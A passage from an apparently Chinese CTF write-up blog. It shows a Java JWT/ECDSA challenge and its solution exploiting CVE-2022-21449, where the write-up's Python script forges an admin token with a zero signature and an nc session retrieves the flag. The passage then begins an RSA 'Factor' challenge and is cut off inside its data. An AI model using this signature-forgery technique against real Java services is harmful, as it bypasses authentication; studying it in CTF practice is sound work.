class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ECDSA</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> KeyPair <span class="title">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">KeyPair keyPair = keyPairGenerator.genKeyPair();</span><br><span class="line"><span class="keyword">return</span> keyPair;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] sign(<span class="keyword">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Signature signature = Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">signature.initSign(privateKey);</span><br><span class="line">signature.update(str);</span><br><span class="line"><span class="keyword">byte</span>[] sig = signature.sign();</span><br><span class="line"><span class="keyword">return</span> sig;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(<span class="keyword">byte</span>[] sig, <span class="keyword">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Signature signature = Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">signature.initVerify(publicKey);</span><br><span class="line">signature.update(str);</span><br><span class="line"><span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jwt</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> EXPIRE = <span class="number">60</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ECDSA ecdsa = <span class="keyword">new</span> ECDSA();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">JSONObject header = <span class="keyword">new</span> JSONObject();</span><br><span class="line">JSONObject payload = <span class="keyword">new</span> JSONObject();</span><br><span class="line">header.put(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">String headerB64 = Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">payload.put(<span class="string">&quot;admin&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">String payloadB64 = Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">String content = String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line"><span class="keyword">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">String sigB64 = Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">String headerB64 = parts[<span class="number">0</span>];</span><br><span class="line">String payloadB64 = parts[<span class="number">1</span>];</span><br><span class="line">String sigB64 = parts[<span class="number">2</span>];</span><br><span class="line">String content = String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line"><span class="keyword">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line"><span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">String payloadB64 = token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">String payloadDecodeString = <span class="keyword">new</span> String(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">JSONObject payload = JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">String err = <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(file));</span><br><span class="line">String flag = br.readLine();</span><br><span class="line">br.close();</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">String user = input.nextLine().strip();</span><br><span class="line">System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">KeyPair keyPair = ecdsa.keyGen();</span><br><span class="line">ECPrivateKey ecPrivateKey = (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">ECPublicKey ecPublicKey = (ECPublicKey) keyPair.getPublic();</span><br><span class="line">String menu = <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">Integer choice = <span class="number">0</span>;</span><br><span class="line">Integer count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line">System.out.print(menu);</span><br><span class="line">choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line"><span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">String token = generateToken(user, ecPrivateKey);</span><br><span class="line">System.out.println(token);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">String token = input.nextLine().strip();</span><br><span class="line">String flag = getFlag(token, ecPublicKey, user);</span><br><span class="line">System.out.println(flag);</span><br><span class="line">input.close();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">input.close();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">task();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>考点在于cve-2022-21449中ECDSA签名校验不对r,s是否为0零判断</p><p>那么，只需要</p><ul><li>改admin为true</li><li>将exp时间改大</li><li>第三部分，签名部分构造并发送（0,0），即十六进制下<code>0000</code></li><li>按题目要求对各部分内容编码</li></ul><p>如上构造好token，交互时对应输入好name，即解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># pt1 = b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=&#x27;</span></span><br><span class="line"><span class="comment"># pt2 = b&#x27;eyJpc3MiOiJxd2IiLCJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTY1OTE4MzQyMDY0Mn0=&#x27;</span></span><br><span class="line"><span class="comment"># sig = b&#x27;UP7MD8__8dXBlkiO_UlSlamsS9obariYmRaB28zQimgKcJLc7XNNzVjhptkqG9BANFacQrxSVWU2cdL1lrYxvm1rZEtN4zHc79x3vsBX0zi5ohTAm3CWZgzT5bgzj52y&#x27;</span></span><br><span class="line">pt1= <span class="string">b&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;myES&quot;&#125;&#x27;</span></span><br><span class="line">pt2 = <span class="string">b&#x27;&#123;&quot;iss&quot;:&quot;qwb&quot;,&quot;name&quot;:&quot;admin&quot;,&quot;admin&quot;:true,&quot;exp&quot;:99999999999999&#125;&#x27;</span></span><br><span class="line">pt3 = base64.b64encode(<span class="built_in">bytes</span>.fromhex(<span class="string">r&#x27;0000&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pt1).decode(), end=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pt2).decode(), end=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pt3.decode())</span><br></pre></td></tr></table></figure><p><strong>output</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(base) wenhui@Caliburn ~ % nc 47.104.76.78 23334</span><br><span class="line">your name:admin</span><br><span class="line">hello admin, let&#x27;s start your challenge.</span><br><span class="line">1.generate token</span><br><span class="line">2.getflag</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">2</span></span><br><span class="line">your token:eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZSwiZXhwIjo5OTk5OTk5OTk5OTk5OX0=.AAA=</span><br><span class="line">flag&#123;cve-2022-21449_Secur1ty_0f_c0de_1mplementation&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{cve-2022-21449_Secur1ty_0f_c0de_1mplementation}</p></blockquote><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen1</span>():</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p2 = getPrime(<span class="number">1792</span>)</span><br><span class="line">p1 = getPrime(<span class="number">1792</span>)</span><br><span class="line"></span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">abs</span>(p1-p2) &lt; (p1//(<span class="number">2</span>*r*q1*q2))):</span><br><span class="line">n1, n2 = (p1**r)*q1, (p2**r)*q2</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1**(r-<span class="number">1</span>))*(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p2**(r-<span class="number">1</span>))*(p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">e1 = randint(<span class="number">5</span>, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">e2 = randint(<span class="number">5</span>, (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">if</span> gcd(e1, e2) == <span class="number">1</span> <span class="keyword">and</span> gcd(phi1, e1) == <span class="number">1</span> <span class="keyword">and</span> gcd(phi2, e2) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> n11, n12, e11, e12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen2</span>():</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q =getPrime(<span class="number">512</span>)</span><br><span class="line">N = (p**r)*q</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(N)) == <span class="number">4096</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(N), idx))</span><br><span class="line">phi = (p**(r-<span class="number">1</span>))*(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">d1 = getPrime(<span class="built_in">int</span>(<span class="number">2048</span>*idx)//<span class="number">2</span>)</span><br><span class="line">d2 = getPrime(<span class="built_in">int</span>(<span class="number">2048</span>*idx)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(d1-d2) &lt; delta:</span><br><span class="line">m1 = invert(d1, phi)</span><br><span class="line">m2 = invert(d2, phi)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">return</span> n2, e2, m1, m2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen3</span>():</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = (p**r)*q</span><br><span class="line">phi = (p**(r-<span class="number">1</span>))*(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(N))-<span class="number">2</span> == <span class="number">4096</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(N), idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">b = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*idx)//<span class="number">2</span>)</span><br><span class="line">a = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*idx)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> a*b &lt; delta:</span><br><span class="line">e3 = invert(a, phi)*b</span><br><span class="line"><span class="keyword">return</span> n3, e3, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n11, n12, e11, e12 = gen1()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n11=<span class="subst">&#123;n11&#125;</span>\nn12=<span class="subst">&#123;n12&#125;</span>\ne11=<span class="subst">&#123;e11&#125;</span>\ne12=<span class="subst">&#123;e12&#125;</span>\n&quot;</span>)</span><br><span class="line">n2, e2, m1, m2 = gen2()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>\ne2=<span class="subst">&#123;e2&#125;</span>\n&quot;</span>)</span><br><span class="line">n3, e3, b = gen3()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n3=<span class="subst">&#123;n3&#125;</span>\ne3=<span class="subst">&#123;e3&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">m3 = bytes_to_long(flag)</span><br><span class="line">c11 = powmod(m1, e11, n11)</span><br><span class="line">c12 = powmod(m2, e12, n12)</span><br><span class="line">c2 = powmod(b, e2, n2)</span><br><span class="line">c3 = powmod(m3, e3, n3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c11=<span class="subst">&#123;c11&#125;</span>\nc12=<span class="subst">&#123;c12&#125;</span>\nc2=<span class="subst">&#123;c2&#125;</span>\nc3=<span class="subst">&#123;c3&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n11=801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line"><span class="string">e11=1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line"><span class="string">n12=635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line"><span class="string">e12=1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n2=209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line"><span class="string">e2=65537</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n3=539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line"><span 